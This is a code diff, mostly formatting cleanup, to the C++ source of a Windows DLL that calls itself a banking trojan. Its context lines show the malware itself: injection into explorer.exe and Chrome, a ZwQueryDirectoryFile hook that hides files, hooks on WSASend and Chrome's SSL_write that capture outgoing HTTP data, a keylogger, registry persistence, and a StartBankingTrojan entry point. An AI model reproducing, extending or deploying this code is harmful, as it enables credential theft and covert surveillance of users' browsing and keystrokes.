@@ -61,7 +61,7 @@ public:
 		std::wstring path(dllPath);
 		size_t pos = path.find_last_of(L"\\/");
 		if (pos == std::wstring::npos) {
-			return false; 
+			return false;
 		}
 		directory = path.substr(0, pos + 1);
 		//MessageBoxW(NULL, directory.c_str(), L"initializeLogger", MB_OK);
@@ -78,7 +78,7 @@ public:
 			if (!ofs->is_open()) {
 				// open stream fail
 				delete ofs;
-				return false; 
+				return false;
 			}
 			logFiles[logName] = ofs;
 		}
@@ -91,7 +91,7 @@ public:
 		auto it = logFiles.find(logName);
 		if (it != logFiles.end()) {
 			// flush without std::endl
-			*(it->second) << message ;
+			*(it->second) << message;
 			it->second->flush();
 		}
 	}
@@ -123,7 +123,7 @@ void initializeLogger() {
 	wchar_t dllPath[MAX_PATH];
 	if (getDLLPath(dllPath)) {
 		if (!Logger::getInstance().initialize(dllPath)) {
-			if(DEBUG)
+			if (DEBUG)
 				MessageBoxW(NULL, L"Fail to initialize Logger", L"initializeLogger", MB_OK);
 		}
 	}
@@ -333,7 +333,7 @@ DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
 	if (!getDLLPath(dllPath)) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
-		return 0;
+		return false;
 	}
 	targetPID = 0;
 
@@ -344,13 +344,13 @@ DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
 			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
 				// If pid not in set, inject to pid
 				DLLinject(targetPID, dllPath);
-				injectedPIDs.insert(targetPID); 
+				injectedPIDs.insert(targetPID);
 			}
 		}
-		Sleep(waitInterval); 
+		Sleep(waitInterval);
 	}
 
-	return 0;
+	return false;
 }
 
 
@@ -366,7 +366,7 @@ DWORD WINAPI InjectChromeThread(LPVOID lpParam)
 	if (!getDLLPath(dllPath)) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to get DLL path", L"ChromeMain", MB_OK);
-		return 0;
+		return false;
 	}
 	std::set<DWORD> targetPIDs;
 
@@ -395,19 +395,19 @@ DWORD WINAPI InjectChromeThread(LPVOID lpParam)
 	while (TRUE) {
 		targetPIDs = getChromePIDs();
 		for (DWORD targetPID : targetPIDs) {
-			
+
 
 			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
 				// If pid not in set, inject to pid
 				DLLinject(targetPID, dllPath);
 				injectedPIDs.insert(targetPID);
-				
+
 			}
 		}
 		Sleep(waitInterval);
 	}
 
-	return 0;
+	return false;
 }
 
 bool TrojanLoader(const wchar_t* dllPath) {
@@ -424,7 +424,7 @@ bool TrojanLoader(const wchar_t* dllPath) {
 		&explorerThreadId
 	);
 	if (hExplorerThread == NULL) {
-		if(DEBUG)
+		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to create InjectExplorerThread", L"TrojanLoader", MB_OK);
 	}
 	// crate InjectChromeThread 
@@ -513,7 +513,7 @@ ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileI
 	case FileInformationClassEx::FileNamesInformation:
 		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
 	default:
-		return 0;
+		return false;
 	}
 }
 
@@ -591,20 +591,20 @@ NTSTATUS DetourZwQueryDirectoryFile(
 }
 
 
-bool explorerMain( ) {
+bool explorerMain() {
 	wchar_t DLLPath[MAX_PATH];
 	if (!getDLLPath(DLLPath)) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
-		return 0;
+		return false;
 	}
-	
+
 	// 取得 ntdll.dll 的 handle
 	HINSTANCE hDLL = LoadLibrary(L"ntdll.dll");
 	if (!hDLL) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to LoadLibrary", L"ExplorerMain", MB_OK);
-		return 1;
+		return true;
 	}
 
 	// 從 ntdll.dll 找到 ZeQueryDirectoryFile
@@ -613,20 +613,20 @@ bool explorerMain( ) {
 	if (!ZwQueryDirectoryFile) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to GetProcAddress", L"ExplorerMain", MB_OK);
-		return 1;
+		return true;
 	}
 
 	// 用 Hook 把 ZwQueryDirectoryFile 竄改成我們定義的 DetourZwQueryDirectoryFile
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
-		return 1;
+		return true;
 	}
 	int status = MH_CreateHook(ZwQueryDirectoryFile, &DetourZwQueryDirectoryFile, reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile));
 	if (status != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"ExplorerMain", MB_OK);
-		return 1;
+		return true;
 	}
 
 	// 啟用 Hook
@@ -634,24 +634,24 @@ bool explorerMain( ) {
 	if (status != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"ExplorerMain", MB_OK);
-		return 1;
+		return true;
 	}
 
 	//--------------
 	//SetFileAttributesW(DLLPath, FILE_ATTRIBUTE_HIDDEN);
 
-	
-	if(DEBUG) 
-		MessageBoxW(NULL, L"Success run to explorer.exe to END", L"ExplorerMain", MB_OK);
-	
 
-	return 1;
+	if (DEBUG)
+		MessageBoxW(NULL, L"Success run to explorer.exe to END", L"ExplorerMain", MB_OK);
+
+
+	return true;
 }
 
 DWORD WINAPI ExplorerMainThread(LPVOID lpParam)
 {
 	explorerMain();
-	return 0;
+	return false;
 }
 
 
@@ -702,7 +702,7 @@ int WSAAPI DetourWSASend(
 		message += "\r\n";
 	}
 	// if message contain http
-	if (message.find("HTTP") != std::string::npos ) {
+	if (message.find("HTTP") != std::string::npos) {
 		if (DEBUG) {
 			//MessageBoxA(NULL, message.c_str(), "DetourWSASend", MB_OK);
 		}
@@ -720,7 +720,7 @@ bool chromeHookWSASend() {
 	if (!hDLL) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookWSASend", MB_OK);
-		return 1;
+		return true;
 	}
 
 	// Get the address of WSASend
@@ -730,16 +730,16 @@ bool chromeHookWSASend() {
 	if (!ZwWSASend) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to GetProcAddress", L"chromeHookWSASend", MB_OK);
-		return 1;
+		return true;
 	}
 
 	/* MH_Initialize move to chromeMain().
-	* 
+	*
 	// Initialize MinHook
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_Initialize", L"chromeHookWSASend", MB_OK);
-		return 1;
+		return true;
 	}*/
 
 	// Create a hook for WSASend
@@ -747,7 +747,7 @@ bool chromeHookWSASend() {
 	if (status != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"chromeHookWSASend", MB_OK);
-		return 1;
+		return true;
 	}
 
 	// Enable the hook
@@ -755,10 +755,10 @@ bool chromeHookWSASend() {
 	if (status != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"chromeHookWSASend", MB_OK);
-		return 1;
+		return true;
 	}
 
-	return 1;
+	return true;
 }
 
 
@@ -785,16 +785,17 @@ bool chromeHookSSL_write()
 	HMODULE hDLL = GetModuleHandleW(L"chrome.dll");
 
 	DWORD_PTR sslWriteOffset = 0x7B4D00; // 129.0.6668.71
-	DWORD_PTR doPayloadWrite = 0x7B4A50; 
+	DWORD_PTR doPayloadWrite = 0x7B4A50;
 
-	BYTE* sslWriteAddress = reinterpret_cast<BYTE*>(hDLL) +sslWriteOffset;
+	BYTE* sslWriteAddress = reinterpret_cast<BYTE*>(hDLL) + sslWriteOffset;
 
 
 	if (!hDLL) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookDoPayloadWrite", MB_OK);
-		return 0;
-	}else
+		return false;
+	}
+	else
 	{
 		/*
 		if (DEBUG) {
@@ -802,17 +803,17 @@ bool chromeHookSSL_write()
 			std::wstring message = L"chrome.dll address: ";
 			message += std::to_wstring((DWORD)hDLL);
 			MessageBoxA(NULL, std::string(message.begin(), message.end()).c_str(), "chromeHookDoPayloadWrite", MB_OK);
-		
+
 		}*/
 	}
 
 	/* MH_Initialize() move to chromeMain()
-	* 
+	*
 	// Initialize MinHook
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Failed to initialize MinHook.", L"chromeHookDoPayloadWrite", MB_OK);
-		return 1;
+		return true;
 	}*/
 
 	if (MH_CreateHook(
@@ -831,7 +832,7 @@ bool chromeHookSSL_write()
 		return false;
 	}
 
-	return 1;
+	return true;
 }
 
 
@@ -840,18 +841,18 @@ int chromeMain() {
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Failed to initialize MinHook.", L"chromeMain", MB_OK);
-		return 1;
+		return true;
 	}
 	chromeHookWSASend();
 	chromeHookSSL_write();
 
-	return 1;
+	return true;
 }
 
 DWORD WINAPI ChromeMainThread(LPVOID lpParam)
 {
 	chromeMain();
-	return 0;
+	return false;
 }
 
 /*
@@ -861,7 +862,7 @@ DWORD WINAPI ChromeMainThread(LPVOID lpParam)
 // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 std::map<int, std::wstring> initializeKeyMap() {
 	std::map<int, std::wstring> keyMap = {
-		{0x08, L"[BACKSPACE]"}, {0x09, L"[TAB]"}, {0x0C, L"[CLEAR]"}, {0x0D, L"[ENTER]\n"},
+		{0x01,L""}, {0x08, L"[BACKSPACE]"}, {0x09, L"[TAB]"}, {0x0C, L"[CLEAR]"}, {0x0D, L"[ENTER]\n"},
 		{0x10, L"[SHIFT]"}, {0x11, L"[CTRL]"}, {0x12, L"[ALT]"}, {0x13, L"[PAUSE]"},
 		{0x14, L"[CAPS LOCK]"}, {0x1B, L"[ESC]"}, {0x20, L"[SPACE]"}, {0x21, L"[PAGE UP]"},
 		{0x22, L"[PAGE DOWN]"}, {0x23, L"[END]"}, {0x24, L"[HOME]"}, {0x25, L"[LEFT]"},
@@ -930,13 +931,13 @@ int keyLoggerMain() {
 		}
 	}
 
-	return 1;
+	return true;
 }
 
 DWORD WINAPI KeyLoggerMainThread(LPVOID lpParam)
 {
 	keyLoggerMain();
-	return 0;
+	return false;
 }
 
 /*
@@ -946,8 +947,7 @@ extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HIN
 {
 	wchar_t dllPath[MAX_PATH];
 
-	if ( !getDLLPath(dllPath)) {
-		if (DEBUG)
+	if (!getDLLPath(dllPath)) {
 			MessageBoxW(NULL, L"Fail to get DLL path", L"StartBankingTrojan", MB_OK);
 		ExitProcess(-1);
 	}
@@ -956,7 +956,7 @@ extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HIN
 	if (isUserAdmin()) {
 		writeRegedit(dllPath);
 	}
-	else if(DEBUG){
+	else if (DEBUG) {
 		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
 		writeRegedit(dllPath); // Maybe fail  but try : (
 	}
@@ -1024,7 +1024,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 					// fail to create thread
 				}
 			}
-			else if (_wcsicmp(processName, exploreName)==0) {
+			else if (_wcsicmp(processName, exploreName) == 0) {
 				// New thread for explorerMain
 				hThread = CreateThread(
 					NULL,
@@ -1066,4 +1066,3 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	}
 	return TRUE;
 }
-
